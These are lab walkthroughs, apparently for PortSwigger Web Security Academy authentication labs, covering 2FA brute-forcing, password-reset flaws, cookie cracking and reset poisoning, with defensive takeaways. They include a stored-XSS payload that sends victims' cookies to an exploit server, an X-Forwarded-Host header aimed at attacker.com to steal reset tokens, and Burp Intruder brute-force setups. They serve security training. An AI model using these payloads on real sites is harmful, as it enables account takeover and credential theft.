* **Shift \+ Click** to select a **range**.  
  Click **"OK"** to confirm your selections.  
7. Then click **OK**. The **Macro Editor** dialog opens.  
8. Click **Test macro** and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly i.e in the last response .  
9. Keep clicking **OK** to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder.

### **🔐 Step 3: Prepare to brute-force 2FA**

In HTTP History, **send the `POST /login2` request** (where you entered the wrong code) to send it to **Intruder**.  
Select the payload position to mfa-code:  
`mfa-code=§5647§`

1. Go to **Payloads tab**:  
   * Payload type: **Numbers**  
   * Range: `0000` to `9999`  
   * Step: `1`  
   * Min/Max digits: set both to **4**  
   * Max fraction digits: **0**  
2. On right side click on resource pool **→** create new resource pool **→** check ☑️ maximum concurrent requests and fill it to 1\.

A **Resource Pool** in Burp controls how **Intruder sends requests**, including **how many it sends in parallel (concurrently)**.

Since the lab **logs you out after more than 2 incorrect 2FA attempts in quick succession**, we limit the **maximum concurrent requests(threads) to 1**.  
 This ensures that **only one 4-digit code is tested at a time**, preventing account lockout and allowing a successful brute-force attack.

### **▶️ Step 4: Start attack**

* Start the Intruder attack.  
* When a request gets a **302 Found**, that’s the correct 2FA code\!

### **🏁 Step :5 Use successful session in browser**

1. Right-click the 302 request → **"Show response in browser"** → Copy the URL.  
2. Paste it into your browser.

**💥Boom You solved the lab**

### **⚙️ What the Macro Does here:**

The macro **automates logging Carlos back in** for every brute-force attempt — so that:

* You always have a **fresh valid session**.  
* Each request to `/login2` is made **after logging in**, which is **required** by the app.  
* You **don’t trigger a lockout**, even if you try 9999 codes.

### **✅ In Summary:**

The **macro**:

* Logs Carlos in again automatically before every brute-force attempt.  
* Keeps your session **fresh**.  
* **Bypasses the logout mechanism**.  
* Enables **Intruder** to test thousands of codes **safely** one-by-one.

Without this macro, the server would detect multiple wrong attempts and kick you out — and your brute-force attack would fail.

## **🔁 What Is a Macro in Burp Suite?**

A **macro** in Burp Suite is a sequence of recorded HTTP requests that Burp can replay automatically to perform tasks like:

* Re-authenticating to a site  
* Grabbing a fresh CSRF token  
* Refreshing expired sessions  
* Navigating multi-step logins

## **🛠️ Common Use Cases for Macros**

* Auto-login before every request (e.g., for Intruder or Repeater)  
* Refresh session cookies  
* Handle CSRF tokens  
* Maintain state for complex apps during automate attacks

In the above lab while performing brute force goto **session tracers** you can see that for every request there is a different **csrf token**.

# **Lab: Password reset broken logic**

## **🎯 Goal:**

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.         

## **✅ Step-by-Step Solution**

### **Step 1:Login as wiener**

Log in as wiener and note its email.

### **🧪 Step 2: Initiate Password Reset for Your Account**

1. Open the lab in your browser with Burp Suite running.  
2. Click on my account .  
3. Enter your own username: `wiener`  
4. Click on forget password.  
5. Enter the wiener’s email.

### **📩 Step 2: Open the email and reset your password**

* Click the **“Email client”** button of wiener.  
* You’ll receive an email with a reset link.  
* Click the link to go to the reset page.  
* Set a **new password** (e.g., `test`).

### **🔍 Step 3: Analyze the password reset request in Burp**

* In **Burp \> Proxy \> HTTP History**, find the **POST** request made when you submitted your new password.  
* You’ll see a request to:  
  `POST/forgot-password?temp-forgot-password-token=<token>`  
* Inspect the body of the request — it will include parameters like:

username=wiener\&new-password-1=Test\&new-password-2=Test

### **🧪 Step 4: Test If Token Is Actually Checked**

1. **Right-click** the POST request and **Send to Repeater**.  
2. In **Repeater**, **remove the token** from:  
   * The URL → /forgot-password?temp-forgot-password-token=  
3. **Send the request**.

4. ✅ If you still see a success response, **token validation is broken**.

Without removing **token validation** you can also change password for carlos 

**🎯 Step 5: Reset Carlos's password**

* Change the username to carlos in the repeater and send the request.  
* You will get HTTP 2/ 302 Found   
* Follow redirection   
* Enter the password for carlos manually in the browser.

**💥BOOM You solve the lab** 

**Vulnerability:**  
 The application allows password resets **without properly validating the reset token**, which is meant to ensure that only the rightful user (who received the reset email) can change their password.

### **🔍 Root Cause**

The application **failed to verify the password reset token** before accepting a password change. It trusted the `username` parameter alone, which is easily manipulated.

### **🔐 Security Lesson**

**Never trust user input alone. Always validate password reset tokens server-side before allowing a password change.**

## **🔓 Lab: Brute-forcing a Stay-Logged-In Cookie**

### **🎯 Goal:**

Access Carlos’s "My account" page by brute-forcing the stay-logged-in cookie.

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.        


## **✅ Step-by-Step Walkthrough**

### **🧪 Step 1: Login as wiener**

* Go to the login page.  
* Enter:  
  * Username: wiener  
  * Password: peter  
  * ✅ Tick “Stay logged in”  
* Click **Log in**.

### **🕵️‍♂️ Step 2: Capture the Cookie**

* Go to **Burp Suite → Proxy → HTTP history**.  
* Find the request to /my-account?id=wiener.  
* Look at the **stay-logged-in** cookie in the request header.  
* Examine this cookie in the [Inspector](https://portswigger.net/burp/documentation/desktop/tools/inspector) panel and notice that it is Base64-encoded and its decoded value is also given wiener:51dc30ddc473d43a6011e9ebba6ca770. It is MD5 hash when you decode 51dc30ddc473d43a6011e9ebba6ca770 this part then you will come to know that it is the password itself i.e peter.

### **🔍 Step 3: Understand the Pattern**

You can guess the format is:  
base64(username+':'+md5HashOfPassword)

### **💣 Step 4: Prepare Burp Intruder Attack**

1. Right-click the /my-account?id=wiener highlight the stay-logged-in cookie parameter and send the request to Burp Intruder.  
2. In **Intruder**:  
   * You will see that stay-logged-in cookie has been automatically added as a payload position.   
     stay-logged-in=$d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw$;

### **⚙️ Step 5: Configure Intruder Payloads**

1. Go to the **Payloads** tab:

   * Payload type: **Simple list**  
   * Add **your password (peter)** for the wiener account.

2. In **Payload Processing**:  
   * Click **Add** the following processing steps **in order**:

     * **Hash** → Method: **MD5**  
     * **Add prefix** → wiener:  
     * **Encode** → **Base64-encode**

 **Why 🙋**

Because stay-logged-in is in the form of base64(username+':'+md5HashOfPassword)

3. Go to **Options → Grep Match**

   * Add a match condition: **Update email**  
   * This helps you detect which request was successful.

As the **Update email** button is only displayed when you access the **My account** page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie.

### **🧪 Step 6: Confirm it Works**

* Click **Start attack**  
* Observe that the response contains **"Update email"** →will give **1** proves the processing works.

### **🛠️ Step 7: Brute Force for Carlos**

1. In the Payload list, remove peter.  
2. Add the **candidate passwords** provided by the lab.  
3. In **Payload Processing**:  
   * Change **prefix** to: carlos: instead of wiener:  
4. In the request:  
   * Change the **URL** from id=wiener to id=carlos

### **▶️ Step 9: Start Attack**

* Start the attack.  
* Look for the **302 response** or the one with **"Update email"** value \= **1**.  
* That payload is the valid cookie for Carlos.

### **🏁 Step 10: When the attack is finished:**

1.  The lab will be solved, If not then copy and paste the show response in the browser.

2. Notice that only one request returned a response containing an Update email. The payload from this request is the valid stay-logged-in cookie for Carlos's account.                     

**💥BOOM you solved the lab**

 🔐 **Security Lessons Learned:**

* Base64 is **not encryption** — it's easily reversible.  
* MD5 is **insecure** and should never be used for password or session token protection.  
* Session cookies must be:  
  * Random and long  
  * Server-side validated  
  * Expirable and invalidated on logout.

# **🔓 Lab: Offline Password Cracking**

**Difficulty**: 🟠 Practitioner  
**Objective**: Steal Carlos’s stay-logged-in cookie, crack the MD5 password hash offline, then log in and delete his account.

## **✅ Step-by-Step Walkthrough**

### **🧪 Step 1: Analyze Your Own Cookie**

1. Log in with:  
   * Username: `wiener`  
   * Password: `peter`  
   * ✅ Tick "Stay logged in"

2. In **Burp Suite → Proxy → HTTP history**:  
   * Locate the **Response** to your login request.  
   * Inspect the **stay-logged-in** cookie in burp inspector.   
3. Inspector will be decode as 

`d2llbmVyOmQ1dDUzM2E0Y2UwN2U0OGUyZDg1MDIxZjM2ZTFiYmVj`  
 → Decodes to:  
 `wiener:51dc30ddc473d43a6011e9ebba6ca770` (The hash part is likely MD5 of your password.)  
51dc30ddc473d43a6011e9ebba6ca770 decode **→peter i,e** the password of wiener.

So the format is:  
`base64(username + ':' + md5(password))`

### **🧨 Step 2: Exploit XSS to Steal Carlos’s Cookie**

1. **Go to the exploit server**.

2. Make note of your **exploit-server URL**, e.g.:  
    `YOUR-ID.exploit-server.net`

Go to any blog post, and post a **comment** with the following **XSS payload** (replace with your server):

`<script>document.location='https://YOUR-ID.exploit-server.net?c='+document.cookie</script>`

3. Go back to your **exploit server**, then open the **Access log**.  
   * Wait for the victim (Carlos) to view the comment.  
      You’ll see a request like:

     `GET /?c=stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

---

### **🧮 Step 3: Crack Carlos’s Password**

Copy the value of the cookie and **Base64-decode** it:

`carlos:26323c16d5f4dabff3bb136f2460a943`

Use a tool like:

* [CrackStation](https://crackstation.net)  
* [https://hashes.com](https://hashes.com)

🔓 The cracked password is:

**`onceuponatime`**

### **🔐 Step 4: Log in as Carlos & Delete Account**

1. Go to the login page.  
2. Enter:  
   * Username: `carlos`  
   * Password: `onceuponatime`  
3. Click **Login**.  
4. Go to **My account**.  
5. Click **Delete account**.

## **💥 Boom Lab Solved\!**

## **🧠 Key Takeaways:**

* **Never store password hashes in cookies**, especially client-side.  
* **MD5 is weak and outdated** — easily brute-forced or searched in rainbow tables.  
* Combining **XSS \+ poor crypto design** is a critical vulnerability.  
* **Always validate session tokens server-side**, and use **random session IDs**.

## **🧠 What We Learned**

### **1\. Weak Cookie Design is Dangerous**

* The `stay-logged-in` cookie stores sensitive info in **Base64(username:MD5(password))** format.  
* This exposes the **password hash** to the client, making it easy to extract and crack offline.

### **2\. MD5 is Not Secure**

* The password is hashed with **MD5**, which is fast and has known vulnerabilities.  
* MD5 hashes can often be cracked instantly using **online databases or rainbow tables**.  
* Do **not use MD5, SHA1**, or other outdated hash algorithms.  
  * Use **bcrypt, scrypt, Argon2**, or **PBKDF2** for password  hashing.  
  * These are slow by design to prevent brute-force attacks.

### **3\. Combining Vulnerabilities \= Exploitation**

* We used a **stored XSS vulnerability** to steal the victim's cookie.  
  This demonstrates how different security flaws can be chained for serious impact.

### **4\. Offline Attacks Are Powerful**

* Once the attacker has the hash, the cracking can happen **completely offline**, unnoticed by the server.

* This bypasses rate limiting, lockouts, and other server-side protections.

### **5\. Secure Session Handling is Critical**

* Never store secrets like password hashes in client-side cookies.  
* Use **secure, random session tokens** that are validated on the server.  
* Set the following flags on cookies:  
- **`HttpOnly`** → Prevents JavaScript from accessing the cookie.

- **`Secure`** → Ensures cookie is only sent over HTTPS.

- **`SameSite=Strict`** → Protects against CSRF.

In the real world, **reputable websites :  🚫do not store passwords in cookies**—and for good reason. Storing passwords in cookies is a major **security risk**.

### **🔍 Here's Why It's a Bad Practice:**

#### **1\. Cookies Are Stored on the Client Side**

* Anything in a cookie can be read (and potentially manipulated) by the client or stolen through attacks like **XSS**.  
* If a hash of the password is stored and the hashing algorithm is weak (e.g. MD5), attackers can **crack it offline** using rainbow tables or brute-force.

#### **2\. Passwords or Hashes Are Long-Term Secrets**

* Cookies are designed to be temporary tokens, not long-term secret storage.  
* If a password or its hash is ever leaked (like in the lab), the attacker has full access — **indefinitely**.

**✅ What Real Websites Do Instead:**

| ❌ Bad Practice | ✅ Best Practice |
| :---- | :---- |
| Store `username:md5(password)` in a cookie | Store a **random session ID** (e.g., `sessid=abc123`) |
| Authenticate user on each request with cookie hash | Authenticate using a **server-side session/token** |
| Trust what’s in the cookie | Validate everything **server-side** |

## 

## 

## 

## 

## **🔓 Lab: Password Reset Poisoning via Middleware**

**🎯 Goal:**

This lab is vulnerable to password reset poisoning.  
 Exploit the password reset functionality to steal **Carlos's reset token**, change his password, and gain access to his account.

Your credentials:  
wiener:peter  
Victim credentials:  
carlos

### **✅ Step-by-Step Walkthrough**

### 

### **🧪 Step 1: Trigger a Password Reset**

1. Log in with your account (wiener:peter) and turn **Burp Suite** on.  
2. Go to **Forgot your password** page.  
   Submit your username (**wiener**) to trigger a password reset.

### **🧠 Step 2: Observe the Reset Link Behavior**

* Open Burp → Go to **Proxy → HTTP history**.  
* Find the **GET /forgot-password?temp-forgot-password-token** request.

Notice: The reset link is emailed and contains a **token** like:  
      GET/forgot-password?temp-forgot-password-token\=gixkgg3sekje3g6353qchz7pyfzdkayx

### **🛠️ Step 3: Send the Request to Repeater**

* Right-click POST /forgot-password → **Send to Repeater**.  
* In Repeater:  
  * Change the **username** to carlos.

**Add a new header:**  
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

* This **tricks the middleware** into sending the reset link with your server as the host.

### **💥 Step 4: Capture Carlos’s Token**

* Go to the **Exploit Server** → **Access logs**  
  You should see a GET /forgot-password request, which contains the victim's token as a query parameter. Make a note of this token.                       
* ✅ This means Carlos clicked the **malicious link**, and you now have **his token**.

### **🔁 Step 5: Reuse Carlos’s Token**

* In your browser, open **your original reset link** (from the email client).  
  Replace your token in the URL with Carlos’s stolen token.  
* This opens the **password reset form for Carlos**.  
* Set a **new password** (e.g., hackedCarlos123).

### **🔐 Step 6: Log In as Carlos**

* Use carlos:hackedCarlos123 to log in.  
* Go to **My account**.

💥 **Boom Lab is Solved\!**

**What is X-Forwarded-Host?**

The X-Forwarded-Host header is a widely used HTTP header that indicates the original hostname and port requested by the client in the Host header, especially when the request has passed through a proxy or load balancer. It helps servers understand the intended destination when the proxy's hostname or port differs from the origin server. 

### **🌍 In the real world, attackers would:**

1. **Use their own domain or server**:

   * Buy a domain like attacker.com  
   * Set up a web server to log requests (can be as simple as Nginx or Flask)

E.g.,  
X-Forwarded-Host: [attacker.com](http://attacker.com)

**The password reset link will be generated like:**  
https://attacker.com/forgot-password?temp-forgot-password-token=XYZ

2. **Send that link to the victim** (via phishing or automated logic):  
   * If the application **doesn't validate the host properly**, the link will look **legit** (coming from the actual app), but the domain will point to the attacker.  
   * When the victim clicks it, the **reset token is leaked** to the attacker.

## **🧪 How to Use X-Forwarded-Host in Testing**

### **✅ Step-by-Step: Using X-Forwarded-Host**

### **🔹 1\. Identify a Function That Sends Links (e.g., Password Reset)**

Look for features like:

* Forgot Password  
* Email confirmation  
* Invite system

You’re looking for a request where the app sends an email to the user with a **link that includes a host/domain**.

### **🔹 2\. Send the Request to Burp Repeater**

In Burp:

* Intercept the password reset request (usually a POST to /forgot-password)  
* Right-click → **Send to Repeater**

### **🔹 3\. Modify the Host Header**

In Repeater, add or modify:

X-Forwarded-Host: YOUR-EVIL-SITE.com

**🧠 Why?**  
 Some servers trust this header and use it to build links:

https://YOUR-EVIL-SITE.com/forgot-password?token=...

This link will be sent to the user (like carlos), and you’ll get the token in **your server logs**.

### **🔹 4\. Send the Request**

Click **Send**.

✅ Check your exploit server (or your own server if testing for real) to see if the victim visited:

* You’ll see a GET request containing their **reset token**.

### **🔹 5\. Use the Stolen Token**

Take that token and insert it into the real reset URL to hijack the victim's account.

### **🧠 Summary**

| Header |  Purpose | Risk |
| ----- | :---- | ----- |
| X-Forwarded-Host | Tells the backend what host the original request used | Can be **spoofed** to hijack reset links |

## 

## **🛡️ How to Defend Against This Vulnerability**

### **🔐 1\. Don’t Trust `X-Forwarded-*` Headers Blindly**

Only trust these headers **if they’re set by a trusted reverse proxy**, and validate them server-side.

### **🌐 2\. Use a Fixed, Hardcoded Base URL**

Reset links should be built using the application’s **own known domain**, not from headers like:

* `Host`

* `X-Forwarded-Host`

**Example Secure Reset Link Construction:**

python  
CopyEdit  
`reset_link = "https://example.com/forgot-password?token=" + token`

### **⛔ 3\. Avoid Putting Sensitive Data in URLs**

Prefer secure POST-based flows or one-time-use reset links that **expire quickly**.

### **🔒 4\. Implement Rate Limiting and Expiration**

* Tokens should **expire quickly** (e.g., 15 minutes).

* Tokens should be **bound to IPs or sessions** where appropriate.

### **🔓 Lab: Password Brute-force via Password Change**

**🎯 Goal**: Brute-force Carlos's password by abusing logic flaws in the password change functionality.

     Your credentials: `wiener:peter` 			  
      Victim's username: `carlos`  
---

### **✅ Step-by-Step Guide**

### **🧪 Step 1: Login as Wiener**

* Visit the lab.  
* Log in using:  
  * **Username:** wiener  
  * **Password:** peter

### **🧪 Step 2: Access the Password Change Form**

* Go to **My Account** → **Change Password**.

* **Observation while changing password:**  
  **Case 1:**  
  **Current password:**peeter (wrong)  
  **New password:**test  
  **Confirm new password:**test

          **Result-\>**

**Lockout**

**Case 2:**

**Current password:**peter

**New password:**test

**Confirm new password:**test

          **Result-\>**

 **Password successfully changed**

**Case 3:**

**Current password:**peter 

**New password:**test

**Confirm new password:**test1

          **Result-\>**

**New passwords do not match**

**✅ This message confirms the current password is correct.**

🚀 So well will brute force this case for 

### **🔍 Observation-Based Logic Flaws**

| 🔢 | Observation | Result | Why It's a Logic Flaw |
| :---- | :---- | :---- | :---- |
|         1️⃣ | Wrong current password \+ matching new passwords | Account gets locked | ❌ The app enforces lockout based on new password match — not current password validity. It prioritizes the wrong check, enabling DoS or brute-force detection bypass. |
|       2️⃣ | Correct current password \+ matching new  passwords | Password is changed | ✅ Normal behavior. |
|     3️⃣ | Correct current password \+ mismatched new passwords | "New passwords do not match" | **⚠️ Leaky logic** — this confirms the current password is correct before validating the new ones. This allows an attacker to enumerate the correct password by brute-forcing based on the error message. |

### **🔁 Step 3: Send the case 3 to Burp Intruder**

* In Burp Suite, go to **Proxy** → **HTTP history**.

* Find the POST request for the **password change of case 3**.

* Right-click it → **Send to Intruder**.

### **⚙️ Step 4: Configure Intruder**

#### **Positions Tab:**

Clear all § markers.

Highlight **current-password** and set it as the payload position.

username=carlos\&current-password=§password§\&new-password-1=abc123\&new-password-2=xyz321

#### **Payloads Tab:**

* Payload type: **Simple list**  
* Paste the **candidate passwords** given in the lab.

#### **Grep Match (in Settings tab):**

Add a new **Grep Match** string:

New passwords do not match

This tells Burp to highlight responses where the current password is correct.

### **🚀 Step 5: Start the Attack**

* Click **Start attack** .  
* Wait for results.

### **🎯 Step 6: Identify Correct Password**

* Look at the **Grep Match** column.

* The password that returns differently "New passwords do not match" is Carlos’s correct password.

### **🔓 Step 7: Log in as Carlos**

* Log out as wiener.

* Log in with:

  * **Username:** carlos  
  * **Password:** (from Intruder results)

* Click **My account** →  **💥Boom Lab is solved\!**

[image1]: <data:image/png;base64,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